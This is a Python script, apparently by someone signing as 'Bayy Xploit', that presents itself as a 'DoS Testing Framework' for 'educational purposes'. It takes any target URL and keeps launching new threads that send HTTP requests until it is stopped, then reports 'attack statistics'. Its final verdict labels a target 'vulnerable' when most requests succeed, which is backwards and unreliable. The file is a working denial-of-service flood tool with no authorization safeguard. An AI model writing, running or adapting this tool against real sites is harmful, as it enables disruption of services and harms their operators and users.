import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import sys
import os
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.align import Align
from rich.layout import Layout
from rich.columns import Columns
import signal

console = Console()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """[bold red]

▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒  [bright_yellow]╔══════════════════════════════╗[/]
▒▒█▒▒▒▄██████████▄▒▒▒▒  [bright_yellow]║[/]    [bold cyan]DoS Testing Framework[/]     [bright_yellow]║[/]
▒█▐▒▒▒████████████▒▒▒▒  [bright_yellow]║[/]   [bold red]Created by Bayy Xploit[/]     [bright_yellow]║[/]
▒▌▐▒▒██▄▀██████▀▄██▒▒▒  [bright_yellow]╚══════════════════════════════╝[/]
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒  [bright_yellow][[/][bold red]WARNING[/][bright_yellow]][/] [bold white]Educational Purposes Only[/]
▐┼▐▒▒██████████████▒▒▒  [bright_yellow][[/][bold cyan]INFO[/][bright_yellow]][/] [bold white]Press Ctrl+C to Stop Attack[/]
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒  [bright_yellow][[/][bold green]MODE[/][bright_yellow]][/] [bold white]Unlimited Threads | Auto-Timer[/]
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
⠀⠀⠀⠀⠀⠀[/]"""
    console.print(Align.center(banner))

class Stats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.timeouts = 0
        self.failed_connections = 0
        self.other_errors = 0
        self.total_time = 0
        self.start_time = time.time()
        self.active = True

def format_number(num):
    return f"{num:,}"

def send_request(url, thread_id, stats, progress):
    if not stats.active:
        return
        
    try:
        start_time = time.time()
        response = requests.get(url, timeout=1)
        end_time = time.time()
        response_time = end_time - start_time
        
        stats.total_requests += 1
        if response.status_code == 200:
            stats.successful_requests += 1
        
        stats.total_time += response_time
        status_panel = Panel(
            f"[bold white]Response:[/] [cyan]{response.status_code}[/]\n[bold white]Time:[/] [blue]{response_time:.3f}s[/]",
            title=f"[bold green]Thread #{thread_id:03d}[/]",
            border_style="bright_yellow",
            padding=(0, 1)
        )
        progress.console.print(status_panel)
        
    except requests.exceptions.Timeout:
        stats.timeouts += 1
        error_panel = Panel(
            "[bold yellow]REQUEST TIMEOUT[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)
    except requests.exceptions.ConnectionError:
        stats.failed_connections += 1
        error_panel = Panel(
            "[bold red]CONNECTION FAILED[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)
    except Exception as e:
        stats.other_errors += 1
        error_panel = Panel(
            f"[bold red]ERROR: {str(e)}[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)

def create_results_display(stats):
    main_stats = Table.grid(padding=1)
    main_stats.add_column(style="bright_yellow", justify="right")
    main_stats.add_column(style="bold white")
    
    main_stats.add_row("Total Requests:", format_number(stats.total_requests))
    main_stats.add_row("Successful:", f"[bold green]{format_number(stats.successful_requests)}[/]")
    main_stats.add_row("Failed:", f"[bold red]{format_number(stats.failed_connections)}[/]")
    main_stats.add_row("Timeouts:", f"[bold yellow]{format_number(stats.timeouts)}[/]")
    main_stats.add_row("Other Errors:", f"[bold red]{format_number(stats.other_errors)}[/]")

    elapsed = time.time() - stats.start_time
    rps = stats.total_requests / elapsed if elapsed > 0 else 0
    success_rate = (stats.successful_requests / stats.total_requests * 100) if stats.total_requests > 0 else 0
    avg_response = (stats.total_time / stats.total_requests) if stats.total_requests > 0 else 0

    perf_stats = Table.grid(padding=1)
    perf_stats.add_column(style="bright_yellow", justify="right")
    perf_stats.add_column(style="bold white")
    
    perf_stats.add_row("Requests/Second:", f"[bold cyan]{rps:.2f}[/]")
    perf_stats.add_row("Success Rate:", f"[bold green]{success_rate:.1f}%[/]")
    perf_stats.add_row("Avg Response:", f"[bold blue]{avg_response:.3f}s[/]")
    perf_stats.add_row("Total Time:", f"[bold magenta]{elapsed:.1f}s[/]")

    layout = Layout()
    layout.split_row(
        Panel(
            main_stats,
            title="[bold red]Attack Statistics[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        ),
        Panel(
            perf_stats,
            title="[bold red]Performance Metrics[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        )
    )

    return layout

def signal_handler(signum, frame):
    raise KeyboardInterrupt

def main():
    clear_screen()
    print_banner()
    
    url = console.input("\n[bright_yellow][[/][bold white]TARGET[/][bright_yellow]][/] [bold cyan]Enter URL:[/] ")
    delay = console.input("[bright_yellow][[/][bold white]SPEED[/][bright_yellow]][/] [bold cyan]Enter delay (0.1-1 sec, default: 0.1):[/] ")
    
    try:
        delay = float(delay)
        if not (0.1 <= delay <= 1):
            delay = 0.1
    except ValueError:
        delay = 0.1

    clear_screen()
    print_banner()
    
    attack_config = f"""[bold white]Target[/] : {url}
[bold white]Mode[/]   : Unlimited Threads
[bold white]Speed[/]  : {delay}s delay"""

    console.print(Panel(
        attack_config,
        title="[bold red]Attack Configuration[/]",
        border_style="bright_yellow",
        padding=(1, 2)
    ))

    stats = Stats()
    signal.signal(signal.SIGINT, signal_handler)
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]Running attack...[/]"),
        BarColumn(pulse_style="red"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        try:
            thread_id = 1
            while stats.active:
                thread = threading.Thread(
                    target=send_request,
                    args=(url, thread_id, stats, progress)
                )
                thread.daemon = True
                thread.start()
                thread_id += 1
                time.sleep(delay)
                
        except KeyboardInterrupt:
            stats.active = False
            console.print("\n[bold yellow]⚠ Attack stopped by user[/]")
        finally:
            time.sleep(1)
            console.print("\n")
            console.print(create_results_display(stats))
            
            if stats.total_requests > 0:
                vulnerability = "Target appears to be [bold green]vulnerable[/]!" if stats.successful_requests / stats.total_requests > 0.8 \
                    else "Target appears to be [bold yellow]resistant[/] to the attack."
                console.print(Panel(
                    vulnerability,
                    title="[bold red]Analysis Result[/]",
                    border_style="bright_yellow",
                    padding=(1, 2)
                ))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n[bold red]Fatal Error: {str(e)}[/]")
        sys.exit(1)
